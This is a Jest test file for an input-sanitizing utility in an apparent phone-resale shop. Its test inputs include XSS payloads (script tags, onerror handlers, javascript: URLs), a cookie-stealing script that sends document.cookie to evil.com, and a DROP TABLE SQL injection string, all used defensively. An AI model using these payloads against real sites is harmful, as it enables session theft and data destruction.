/**
 * Tests for sanitize utility - XSS prevention and input cleaning
 */

import {
  stripHtmlTags,
  escapeHtml,
  normalizeInput,
  sanitizeInput,
  sanitizeEmail,
  sanitizePhone,
  sanitizeNumeric,
  sanitizeSearchQuery,
  isSafeString,
  sanitizeCheckoutFormData,
  sanitizeProductData,
} from '../utils/sanitize';

describe('Sanitize Module', () => {
  // HTML Tag Stripping Tests
  describe('stripHtmlTags', () => {
    it('should remove HTML tags', () => {
      const result = stripHtmlTags('Hello <b>World</b>');
      expect(result).toBe('Hello World');
    });

    it('should remove script tags', () => {
      const result = stripHtmlTags('<script>alert("XSS")</script>Hello');
      expect(result).toBe('alert("XSS")Hello');
    });

    it('should handle multiple tags', () => {
      const result = stripHtmlTags('<h1>Title</h1><p>Content</p>');
      expect(result).toBe('TitleContent');
    });

    it('should return empty string for non-strings', () => {
      const result = stripHtmlTags(null);
      expect(result).toBe('');
    });
  });

  // HTML Escaping Tests
  describe('escapeHtml', () => {
    it('should escape special characters', () => {
      const result = escapeHtml('<script>alert("XSS")</script>');
      expect(result).not.toContain('<script>');
    });

    it('should preserve safe text', () => {
      const result = escapeHtml('Hello World');
      expect(result).toContain('Hello World');
    });
  });

  // Input Normalization Tests
  describe('normalizeInput', () => {
    it('should trim whitespace', () => {
      const result = normalizeInput('  Hello World  ');
      expect(result).toBe('Hello World');
    });

    it('should normalize multiple spaces', () => {
      const result = normalizeInput('Hello    World');
      expect(result).toBe('Hello World');
    });

    it('should return empty string for non-strings', () => {
      const result = normalizeInput(123);
      expect(result).toBe('');
    });
  });

  // General Input Sanitization Tests
  describe('sanitizeInput', () => {
    it('should trim, remove HTML, and normalize', () => {
      const result = sanitizeInput('  <b>Hello</b>    World  ');
      expect(result).toBe('Hello World');
    });

    it('should truncate to max length', () => {
      const long = 'a'.repeat(1100);
      const result = sanitizeInput(long, 1000);
      expect(result.length).toBeLessThanOrEqual(1000);
    });

    it('should handle XSS attempts', () => {
      const result = sanitizeInput('Name<script>alert("XSS")</script>');
      expect(result).not.toContain('<script>');
    });

    it('should return empty string for non-strings', () => {
      const result = sanitizeInput(null);
      expect(result).toBe('');
    });
  });

  // Email Sanitization Tests
  describe('sanitizeEmail', () => {
    it('should trim and lowercase email', () => {
      const result = sanitizeEmail('  TEST@EXAMPLE.COM  ');
      expect(result).toBe('test@example.com');
    });

    it('should return empty string for non-strings', () => {
      const result = sanitizeEmail(123);
      expect(result).toBe('');
    });
  });

  // Phone Sanitization Tests
  describe('sanitizePhone', () => {
    it('should remove spaces and dashes', () => {
      const result = sanitizePhone('98-7654-3210');
      expect(result).toBe('9876543210');
    });

    it('should remove brackets', () => {
      const result = sanitizePhone('(987)654-3210');
      expect(result).toBe('9876543210');
    });

    it('should preserve +91 prefix', () => {
      const result = sanitizePhone('+91 98765 43210');
      expect(result).toBe('+919876543210');
    });

    it('should return empty string for non-strings', () => {
      const result = sanitizePhone(null);
      expect(result).toBe('');
    });
  });

  // Numeric Sanitization Tests
  describe('sanitizeNumeric', () => {
    it('should extract only digits and decimal', () => {
      const result = sanitizeNumeric('12,345.67');
      expect(result).toBe('12345.67');
    });

    it('should remove letters and symbols', () => {
      const result = sanitizeNumeric('Price: $100.00');
      expect(result).toBe('100.00');
    });

    it('should return empty string for non-strings', () => {
      const result = sanitizeNumeric(null);
      expect(result).toBe('');
    });
  });

  // Search Query Sanitization Tests
  describe('sanitizeSearchQuery', () => {
    it('should clean and trim search query', () => {
      const result = sanitizeSearchQuery('  iPhone 13  ');
      expect(result).toBe('iPhone 13');
    });

    it('should remove HTML from search', () => {
      const result = sanitizeSearchQuery('iPhone <script>');
      expect(result).not.toContain('<script>');
    });

    it('should truncate long queries', () => {
      const long = 'a'.repeat(300);
      const result = sanitizeSearchQuery(long, 200);
      expect(result.length).toBeLessThanOrEqual(200);
    });

    it('should normalize whitespace', () => {
      const result = sanitizeSearchQuery('iPhone    13    Pro');
      expect(result).toBe('iPhone 13 Pro');
    });
  });

  // Safety String Check Tests
  describe('isSafeString', () => {
    it('should accept safe strings', () => {
      expect(isSafeString('Hello World')).toBe(true);
    });

    it('should reject script tags', () => {
      expect(isSafeString('<script>alert("XSS")</script>')).toBe(false);
    });

    it('should reject javascript protocol', () => {
      expect(isSafeString('javascript:alert("XSS")')).toBe(false);
    });

    it('should reject event handlers', () => {
      expect(isSafeString('<img onerror="alert(1)">')).toBe(false);
    });

    it('should reject iframe tags', () => {
      expect(isSafeString('<iframe src="malicious.com"></iframe>')).toBe(false);
    });

    it('should reject eval', () => {
      expect(isSafeString('eval(code)')).toBe(false);
    });

    it('should accept non-strings as safe', () => {
      expect(isSafeString(null)).toBe(true);
      expect(isSafeString(123)).toBe(true);
    });
  });

  // Checkout Form Data Sanitization Tests
  describe('sanitizeCheckoutFormData', () => {
    it('should sanitize all form fields', () => {
      const form = {
        name: '  John Doe  ',
        email: '  TEST@EXAMPLE.COM  ',
        phone: '98-7654-3210',
        pincode: '560001',
        address: '  123 Main St  ',
      };
      const result = sanitizeCheckoutFormData(form);
      
      expect(result.name).toBe('John Doe');
      expect(result.email).toBe('test@example.com');
      expect(result.phone).toBe('9876543210');
      expect(result.pincode).toBe('560001');
      expect(result.address).toBe('123 Main St');
    });

    it('should prevent XSS in form data', () => {
      const form = {
        name: 'John <script>alert("XSS")</script> Doe',
        email: 'test@example.com',
        phone: '9876543210',
        pincode: '560001',
        address: 'Main St<img onerror="alert(1)">',
      };
      const result = sanitizeCheckoutFormData(form);
      
      expect(result.name).not.toContain('<script>');
      expect(result.address).not.toContain('onerror');
    });
  });

  // Product Data Sanitization Tests
  describe('sanitizeProductData', () => {
    it('should sanitize product fields', () => {
      const product = {
        name: '  iPhone 13  ',
        price: '  649  ',
        category: '  smartphone  ',
        description: '  Great phone  ',
        image: '  https://example.com/image.jpg  ',
        condition: '  Excellent  ',
        specs: ['  128GB  ', '  Blue  '],
      };
      const result = sanitizeProductData(product);
      
      expect(result.name).toBe('iPhone 13');
      expect(result.category).toBe('smartphone');
      expect(result.specs[0]).toBe('128GB');
    });

    it('should prevent XSS in product data', () => {
      const product = {
        name: 'iPhone<script>alert("XSS")</script>',
        price: '649',
        category: 'smartphone',
        description: 'Product<img onerror="alert(1)">',
        image: 'https://example.com/image.jpg',
        condition: 'Excellent',
        specs: [],
      };
      const result = sanitizeProductData(product);
      
      expect(result.name).not.toContain('<script>');
      expect(result.description).not.toContain('onerror');
    });

    it('should handle null/undefined product', () => {
      const result = sanitizeProductData(null);
      expect(result).toEqual({});
    });

    it('should handle missing specs', () => {
      const product = {
        name: 'iPhone',
        price: '649',
        category: 'smartphone',
        description: 'Great phone',
      };
      const result = sanitizeProductData(product);
      expect(result.specs).toEqual([]);
    });
  });

  // Integration Tests
  describe('Integration Tests', () => {
    it('should handle complete XSS attack attempts', () => {
      const maliciousInput = `
        <script>
          fetch('https://evil.com/steal?cookie=' + document.cookie);
        </script>
        Normal Text
      `;
      const result = sanitizeInput(maliciousInput);
      // Key security check: script tags are removed
      expect(result).not.toContain('<script>');
      // The content is now plain text, not executable code
      expect(result).toContain('Normal Text');
      // The word "fetch" in plain text is not a security risk
      // (it won't execute without script tags)
    });

    it('should handle SQL-like injection attempts', () => {
      const sqlInjection = "'; DROP TABLE users; --";
      const result = sanitizeInput(sqlInjection);
      expect(result).toBe("'; DROP TABLE users; --");
      // Sanitizer doesn't prevent SQL injection (DB layer should handle it)
      // but ensures no HTML/JS injection
    });

    it('should preserve legitimate data while removing threats', () => {
      const data = 'User: John Doe (john@example.com) <script>alert(1)</script>';
      const result = sanitizeInput(data);
      expect(result).toContain('John Doe');
      expect(result).toContain('john@example.com');
      expect(result).not.toContain('<script>');
    });
  });
});
